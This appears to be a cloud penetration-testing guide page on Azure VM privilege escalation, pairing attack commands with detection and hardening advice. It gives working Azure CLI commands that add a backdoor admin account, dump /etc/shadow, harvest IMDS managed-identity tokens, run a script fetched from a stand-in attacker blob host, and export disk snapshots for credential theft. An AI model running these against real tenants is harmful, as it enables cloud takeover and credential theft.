---
cstg_id: CSTG-AZURE-VIRTUAL-MACHINES-PRIVESC
title: "AZURE Virtual Machines - Privilege Escalation"
provider: azure
service: virtual-machines
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - "Microsoft.Compute/virtualMachines/runCommand/action"
  - "Microsoft.Compute/virtualMachines/runCommands/write"
  - "Microsoft.Compute/virtualMachines/extensions/write"
  - "Microsoft.Compute/virtualMachines/write"
  - "Microsoft.Compute/virtualMachines/login/action"
  - "Microsoft.Compute/virtualMachines/loginAsAdmin/action"
  - "Microsoft.Compute/disks/beginGetAccess/action"
  - "Microsoft.Compute/snapshots/write"
  - "Microsoft.Compute/snapshots/beginGetAccess/action"
  - "Microsoft.Network/networkSecurityGroups/securityRules/write"
tools:
  - azure-cli
  - azure-powershell-az
  - microburst
  - azurehound
  - powerzure
  - bloodhound
references:
  - "https://learn.microsoft.com/en-us/azure/virtual-machines/run-command-overview"
  - "https://learn.microsoft.com/en-us/azure/virtual-machines/extensions/custom-script-windows"
  - "https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/how-to-use-vm-token"
  - "https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles"
  - "https://www.rhinosecuritylabs.com/cloud-security/abusing-azure-managed-identities/"
  - "https://hackingthe.cloud/azure/"
license: CC BY-SA 4.0
---

## Summary

This page covers privilege escalation in and through Azure Virtual Machines. Two escalation directions matter:

1. **Control-plane to in-guest code execution.** A principal with certain `Microsoft.Compute/virtualMachines/*` action rights can execute arbitrary code as SYSTEM/root inside a VM without any OS credential - via Run Command, the Custom Script Extension, or by resetting credentials. This crosses the boundary from Azure RBAC into the operating system.
2. **In-guest to cloud-plane via managed identity.** Code execution on a VM that has an assigned managed identity yields Entra ID tokens. If that identity holds broad RBAC (Contributor/Owner) or directory roles, the attacker escalates from a single host to subscription- or tenant-wide control.

The unifying objective: convert limited VM-scoped permissions, or a foothold on one host, into broader control of the subscription, additional resources, and ultimately the directory. Each permission that enables a path is documented in its own subsection below.

## Prerequisites

- An assumed-breach Entra ID principal (user, service principal, or managed identity) holding one or more of the listed VM action permissions at some scope, **or** OS-level code execution on a VM with a managed identity.
- Azure CLI / Az PowerShell or a raw ARM token.
- Knowledge of which VMs carry privileged managed identities (from the [Enumeration](../02-services/azure-virtual-machines-enum.md) phase).

## Enumeration

```bash
# Which VMs can I run commands on / write extensions to? Check effective permissions:
az role assignment list --assignee <principalId> --all -o table

# Identify VMs with privileged identities to target for code execution:
az vm list --query "[?identity!=null].{name:name,rg:resourceGroup,principalId:identity.principalId}" -o json
# Then resolve each principalId's role assignments:
az role assignment list --assignee <vm-identity-principalId> --all -o table
```

## Misconfigurations & Findings

- A non-admin principal granted **Virtual Machine Contributor** (which includes `runCommand` and extension write) over VMs whose identities are privileged - effectively a path to those identities' permissions.
- VMs running with **system-assigned identities that hold Contributor or Owner** at subscription scope.
- VMs whose identity can read Key Vault secrets or reset other principals' credentials.
- `Microsoft.Compute/virtualMachines/login/action` granted broadly (Virtual Machine User Login) where the local session can then reach a privileged IMDS identity.
- NSG-write permitting an attacker to open management ports for a follow-on credential attack.

## Exploitation

### Microsoft.Compute/virtualMachines/runCommand/action

Run Command executes a script in the VM's guest OS as **SYSTEM** (Windows) or **root** (Linux) through the VM agent, with no OS credentials required. It is the most direct control-plane-to-guest escalation.

```bash
# Windows: run arbitrary PowerShell as SYSTEM
az vm run-command invoke -g <rg> -n <vm> \
  --command-id RunPowerShellScript \
  --scripts "whoami; net user attacker P@ssw0rd123! /add; net localgroup administrators attacker /add"

# Linux: run as root
az vm run-command invoke -g <rg> -n <vm> \
  --command-id RunShellScript \
  --scripts "id; cat /etc/shadow; curl -s -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'"
```

The final command above harvests the VM's managed-identity token from IMDS, immediately pivoting to the cloud plane.

### Microsoft.Compute/virtualMachines/runCommands/write

The managed Run Command (`runCommands`, persistent variant) achieves the same SYSTEM/root execution and persists the command object on the VM. It is created via a sub-resource write rather than a single action, so a principal with only `runCommands/write` (not the older `runCommand/action`) can still execute code.

```bash
az vm run-command create -g <rg> -n <vm> --run-command-name pwn \
  --script "whoami /priv" --async-execution false
az vm run-command show -g <rg> -n <vm> --run-command-name pwn --instance-view
```

### Microsoft.Compute/virtualMachines/extensions/write

The Custom Script Extension downloads and runs a script as SYSTEM/root. Writing an extension to a VM is therefore equivalent to code execution.

```bash
az vm extension set -g <rg> --vm-name <vm> \
  --name CustomScript --publisher Microsoft.Azure.Extensions \
  --settings '{"fileUris":["https://attacker.blob.core.windows.net/x/run.sh"],"commandToExecute":"bash run.sh"}'
```

On Windows the analogous publisher/type is `Microsoft.Compute / CustomScriptExtension`. DSC and other script-bearing extensions provide equivalent execution.

### Microsoft.Compute/virtualMachines/write

Full write over the VM object permits attaching a **user-assigned managed identity** of the attacker's choosing (if they can also reference one), or modifying the OS profile to inject credentials at next boot, or resetting the local admin password via the VMAccess extension. It also allows attaching a privileged identity already present in the subscription to a VM the attacker can execute on.

```bash
# Reset local admin credentials via the VMAccess extension
az vm user update -g <rg> -n <vm> -u azureadmin -p 'N3wP@ssw0rd!'

# Attach an existing (privileged) user-assigned identity to a VM you control
az vm identity assign -g <rg> -n <vm> --identities /subscriptions/<sub>/resourcegroups/<rg>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<privileged-uai>
```

### Microsoft.Compute/virtualMachines/login/action and loginAsAdmin/action

With Entra ID login for VMs enabled, `login/action` (Virtual Machine User Login) or `loginAsAdmin/action` (Virtual Machine Administrator Login) lets the principal sign in to the guest using their Entra credentials. Once on the host, the principal can query IMDS for the VM's managed-identity token - escalating to whatever that identity can do, even though the user's own Azure role may be unprivileged.

```bash
az ssh vm -g <rg> -n <vm>            # Entra-based SSH
# then on the host:
curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### Microsoft.Compute/disks/beginGetAccess/action and snapshots/beginGetAccess/action

These grant a time-limited SAS download URL for a managed disk or snapshot, enabling offline export of an OS disk. The exported disk can be mounted offline to extract SAM/SYSTEM hives (Windows) or `/etc/shadow` and SSH keys (Linux), recovering credentials that may be reused elsewhere - a lateral/escalation path that leaves no in-guest trace.

```bash
az snapshot create -g <rg> -n snap1 --source <osDiskId>
az snapshot grant-access -g <rg> -n snap1 --duration-in-seconds 3600 --access-level Read   # returns SAS URL
# download with azcopy, mount offline, extract hives/keys
```

### Microsoft.Compute/snapshots/write

Creating a snapshot of another VM's OS disk (then exporting it as above) achieves the same offline credential recovery without touching the running VM.

### Microsoft.Network/networkSecurityGroups/securityRules/write

NSG rule write does not itself escalate, but it enables escalation by opening an inbound management port (or a callback path) so that a follow-on credential attack or a reverse shell from in-guest code can succeed.

```bash
az network nsg rule create -g <rg> --nsg-name <nsg> -n allow-rdp \
  --priority 100 --access Allow --direction Inbound --protocol Tcp \
  --destination-port-ranges 3389 --source-address-prefixes <attacker-ip>/32
```

## Detection & Logging

- **Azure Activity Logs** record each escalation primitive as a distinct operation: `Microsoft.Compute/virtualMachines/runCommand/action`, `.../runCommands/write`, `.../extensions/write`, `.../write`, `.../login/action`, `Microsoft.Compute/disks/beginGetAccess/action`, `Microsoft.Compute/snapshots/write` and `.../beginGetAccess/action`, and `Microsoft.Network/.../securityRules/write`. Run Command and Custom Script Extension on a VM that does not normally receive them is high-fidelity.
- **Entra ID sign-in logs** show managed-identity token issuance and any new Entra VM login; service-principal sign-ins from unusual IPs after a token harvest are key indicators.
- **Microsoft Defender for Cloud / Defender for Servers** alerts on suspicious Run Command/Custom Script execution, snapshot export, and "managed identity used from an unusual location".
- **In-guest** evidence: new local admin accounts (Event ID 4720/4732), VM agent extension logs under `C:\WindowsAzure\Logs` or `/var/log/azure`.

## Remediation & Hardening

- Treat `runCommand`, `runCommands/write`, and `extensions/write` as code-execution-equivalent; restrict the roles that grant them (Virtual Machine Contributor, Contributor, Owner) to a minimal set and scope them tightly.
- Right-size managed identities: never grant a VM identity more than the workload needs; avoid subscription-scoped Contributor/Owner on VM identities.
- Restrict disk/snapshot `beginGetAccess` and set `networkAccessPolicy` to `DenyAll`.
- Gate Entra VM login with Conditional Access and limit Administrator Login assignments.
- Use Azure Policy and PIM/just-in-time elevation for any role granting VM write/execute actions.
- Alert on Run Command / Custom Script Extension as a rule, not an exception.

## Tools

- **Azure CLI / Az PowerShell** - invoke Run Command, set extensions, manage identities and snapshots.
- **MicroBurst / PowerZure** - automate VM command execution, token theft, and identity abuse.
- **AzureHound + BloodHound** - map which principals can execute on which privileged-identity VMs.

## References

- Run Command overview - https://learn.microsoft.com/en-us/azure/virtual-machines/run-command-overview
- Custom Script Extension - https://learn.microsoft.com/en-us/azure/virtual-machines/extensions/custom-script-windows
- Use a VM managed-identity token - https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/how-to-use-vm-token
- Azure built-in roles - https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles
- Rhino Security Labs - Abusing Azure Managed Identities - https://www.rhinosecuritylabs.com/cloud-security/abusing-azure-managed-identities/
- Hacking the Cloud - Azure - https://hackingthe.cloud/azure/
